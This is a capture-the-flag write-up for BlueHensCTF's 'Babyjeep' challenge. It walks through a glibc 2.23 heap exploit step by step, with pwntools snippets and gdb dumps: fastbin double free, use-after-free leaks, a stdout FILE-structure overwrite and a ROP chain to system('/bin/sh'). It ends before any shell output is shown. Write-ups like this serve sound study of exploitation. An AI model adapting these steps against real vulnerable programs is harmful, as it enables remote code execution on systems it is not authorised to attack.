# Babyjeep: BlueHensCTF

This was heap based binary exploitation challenge, as I had exams, I didn't get the time to look out for this, so I have sometime now, I will do it and log the workflow here, also this challenge had a pretty double free vulnerability which could be turn into the arbitrary write by taking advantage of performing a fastbin dup.
But this became an issue because of the constraints we had, listed below:-

```

As you can see that the `obj.chungus` is not being checked for itself being already free or this pointer is not being updated once `free(chungus[idx])` is called.
The vulnerability was in this binary was of the double free and the given libc was `GLIBC 2.23`, so from that we know it could be considered to be just double free.
Also, the `show` function had UAF as well, allowing us to leak addresses.

##### Constraints

The reasonable constraint we had here is size check for the allocation which was only limited for the fastbin size apparently, even less being `111`.

# Exploitation

For the sake of understanding, I will split the exploit in 4 section, are as follows:-

* Heap Leak
* LIBC Leak
* Preparing for RIP control
* Get Shell


### Heap Leak

This is the foremost thing to do, meaning that we have to have a heap leak to carry out the whole exploit. So, to do so, we will just perform double free from the `delete` function and use the UAF in the `show` to leak the heap address, since `fd` of the chunk woule be populated as multiple chunks from the same size would be `free`. the linked list would be populated, hence giving us address of a chunk.

```py
malloc(0,0x40,b"A")  # chungus[0]
malloc(1,0x40,b"B")  # chungus[1]
malloc(2,0x40,b"C")  # chungus[2]
malloc(3,0x40,b"D")  # chungus[3]
malloc(4,0x40,b"E")  # chungus[4]

free(0)
free(1)
free(0)
```
Now, the free list would be ` chunk[0]->chunk[1]->chunk[0]`. Now, we will leak the heap address.


```py
heap_leak = show(0)[1:7]
heap_leak = u64(heap_leak+b"\x00\x00")
log.info(f"HEAP:  {hex(heap_leak)}")
```

### LIBC Leak

Now, we have the heap leak, so we could craft an overlapping chunk such that creating a fake chunk making it look like a chunk that will belong to the smallbin once `free`'d. This sounds a bit intimidating but it is not, if you figure out the pattern. I'll try my best to simplify:-

We will first, reuqest for `chunk[0]`, this will give us the ability to overwrite the `fd` of the `chunk[0]` such that the it will be returned in th next allocation request from the same bin.

Let's see for now:-

```py
malloc(0,0x40,p64(heap_leak-0x10)+p64(0x0)*6+p64(0x51))
```

We will get the `chunk[0]`, now we make the `fd` of it pointing to the `chunk[1] - 0x10` and continue to fill the buffer such that the memory content of the heap looks like:-

```r
gef➤  x/40xg 0x55a76febb060 - 0x60
0x55a76febb000:	0x0000000000000000	0x0000000000000051  <--  chunk[0]
0x55a76febb010:	0x000055a76febb040	0x0000000000000000
0x55a76febb020:	0x0000000000000000	0x0000000000000000
0x55a76febb030:	0x0000000000000000	0x0000000000000000
0x55a76febb040:	0x0000000000000000	0x0000000000000051  <--  fake_chunk
0x55a76febb050:	0x0000000000000000	0x0000000000000051  <--  chunk[1]
0x55a76febb060:	0x000055a76febb000	0x0000000000000000
0x55a76febb070:	0x0000000000000000	0x0000000000000000
```

> The pointers pointed by the bin head would point directly to `chunk + 0x10` i.e. from the `fd`.
Now, we will just go on with getting the chunks and work usually:-

```py
malloc(1,0x40,b"A")
malloc(5,0x40,b"B")
```

Now, for next allocation, we will get the `0x55...40` because what was the value of the `fd` of the `chunk[1]`. Now, since we created a `chunk[1]` with the size to be pointed at that, we will be able to tamper the `chunk[1]` metadata.

```py
malloc(6,0x40,p64(0x0)+p64(0xf1))
```

Doing so:-

```r
0x55a76febb040:	0x0000000000000000	0x0000000000000051
0x55a76febb050:	0x0000000000000000	0x00000000000000f1
0x55a76febb060:	0x000055a76febb041	0x0000000000000000
```

Now, when we free the `chunk[1]` it will go into the unsorted bin and the `fd` and `bk` would be populated with the `main_arena` address, hence using the UAF from the `show` function, we will get the `main_arena` address, apparently, the LIBC base address.

```py
free(1)
libc_leak = show(1)[1:7]
libc_leak = u64(libc_leak+b"\x00\x00")
libc.address = libc_leak - 0x3c4b78
```
Heap:-

```r
0x55962973d040:	0x0000000000000000	0x0000000000000051
0x55962973d050:	0x0000000000000000	0x00000000000000f1
0x55962973d060:	0x00007fc95f874b78	0x00007fc95f874b78
```

# Preparing for the RIP Control

To do the said, we have to go the way, we will first create a fake chunk on top of the `_IO_2_1_stdout_`, at best we do this because implying many of the few techniques of simply overwriting the `__malloc_hook` from here didn't worked, so to get the RIP control, the way to go from here is create a chunk of some sort near the `_IO_2_1_stdout_`.

Now, first we will attempt to make the chunk of size `0x71` and peform double free to create chunk at the `_IO_2_1_stdout` by overwriting the `fd`:-

```py
malloc(0,0x40,b"A")
malloc(1,0x40,b"B")
malloc(2,0x40,b"C")

malloc(0,0x60,b"A")
malloc(1,0x60,b"B")
malloc(2,0x60,b"C")

free(0)
free(2)
free(0)
```

Now, we will overwrite the `fd` of the `chunk[0]` with the an address from the `_IO_2_1_stdout` region such that it would suffice the size check.

```py
malloc(0,0x60,p64(IO_2_1_stdout))
malloc(5,0x60,"A")
malloc(2,0x60,"B")
malloc(3,0x60,b"C"*3+p64(0x0)*4+p64(0x71)+p64(0x0))
```

Now, this will create a chunk near the `_IO_2_1_stdout_`. The first chunk would look like:-

```r
0x7f193ff705f8 <_IO_2_1_stderr_+184>:	0x0000000000000000	0x0000000000000000
0x7f193ff70608 <_IO_2_1_stderr_+200>:	0x0000000000000000	0x0000000000000071
```

Now, since having near a chunk near the `_IO_2_1_stderr_`, we will just now overwrite the following data as such:-

```r
$4 = {
  file = {
    _flags = 0xfbad2887, 
    _IO_read_ptr = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_end = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_base = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_base = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_ptr = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_end = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_buf_base = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_buf_end = 0x7f193ff706a4 <_IO_2_1_stdout_+132> "", 
```

We will make this as following:-

```r
$4 = {
  file = {
    _flags = 0xfbad1800, 
    _IO_read_ptr = 0 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_end = 0 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_base = 0 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_base = environ <_IO_2_1_stdout_+131> "\n", 
    _IO_write_ptr = environ+0x20 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_end = environ+0x20 <_IO_2_1_stdout_+131> "\n", 
    _IO_buf_base = environ+0x20 <_IO_2_1_stdout_+131> "\n", 
    _IO_buf_end = environ+0x21 <_IO_2_1_stdout_+132> "", 
```

This will result in leaking the stack address, from here we can calculate stack address as such that we will calculate the `ret` value so that we will take advantage of it.

```py
malloc(0,0x60,p64(_IO_2_1_stderr_200))
malloc(5,0x60,"A")
malloc(2,0x60,"B")
malloc(3,0x60,b"A"*8+p64(0xfbad1800)+p64(0x0)*3+p64(environ)+p64(environ+0x20)*3+p64(environ+0x21))
```

Now, once any IO based function will be called, we will get the leaks:-

```py
stack_leak = p.recvuntil(b"Malloc")

stack_leak = u64(stack_leak[1:9])
ret = stack_leak - 0x110 - 0x43
```

That being done, we can now move on to the `get_shell` part since from here we have the `ret` address, we can just do double free again and overwrite the return address, getting the RIP control.

# Get Shell

Now, we will fix the chunks again by allocating the `0x71` chunks:-

```py
malloc(0,0x60,b"A")
malloc(1,0x60,b"B")
malloc(2,0x60,b"C")
malloc(3,0x60,b"A")
malloc(4,0x60,b"B")
malloc(5,0x60,b"C")

free(0)
free(2)
free(0)
```

Now, we will just put the `ret` at `fd` of the `chunk[0]` also sufficing the size check done by the `malloc` so no exceptions happen, now we will just allocate chunks and overwrite the `ret` with a simple ROP chain:-

```py
malloc(0,0x60,p64(ret))
malloc(5,0x60,"A")
malloc(2,0x60,"B")
malloc(3,0x60,b"A"*19+p64(pop_rdi)+p64(binsh)+p64(system))
```

Now, we will get the shell:-
